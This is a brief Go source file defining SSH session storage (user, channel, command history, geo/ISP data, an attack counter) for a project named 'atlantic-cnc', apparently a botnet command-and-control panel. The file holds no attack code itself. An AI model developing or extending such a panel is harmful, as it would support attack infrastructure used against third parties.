package sessions

import (
	"atlantic-cnc/core/models/json/meta"
	"atlantic-cnc/core/mysql"
	GeoAPI "atlantic-cnc/tools/geo-api"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

var (
	SessionMap = make(map[int64]*Session_Store)
	NyxMux	   sync.Mutex
)


type Session_Store struct {
	Int_ID		int64
	User		*database.User
	Channel     ssh.Channel
	Conn        *ssh.ServerConn
	Chat		bool
	Creation	time.Time
	Commands []string
	GeoISP *GeoAPI.API_Resp
	Attacks int
	CurrentTheme *meta.CSMTheme
}
